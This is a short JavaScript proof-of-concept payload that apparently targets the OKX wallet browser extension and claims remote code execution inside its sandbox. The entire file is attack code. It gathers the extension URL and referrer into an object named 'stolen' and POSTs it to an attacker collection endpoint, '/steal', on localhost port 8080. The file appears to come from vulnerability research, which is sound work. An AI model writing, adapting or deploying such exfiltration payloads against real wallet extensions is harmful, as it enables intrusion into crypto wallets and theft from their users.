// This executes inside extension sandbox when fetched
(async () => {
  // Confirm RCE works
  console.log('[POC] RCE achieved in OKX sandbox!');
  
  // Collect extension data
  const stolen = {
    extUrl: window.location.href,
    parentUrl: document.referrer,
    timestamp: Date.now()
  };
  
  // Send to your server.js
  await fetch('http://localhost:8080/steal', {
    method: 'POST',
    body: JSON.stringify(stolen),
    headers: {'Content-Type': 'application/json'}
  });
})();
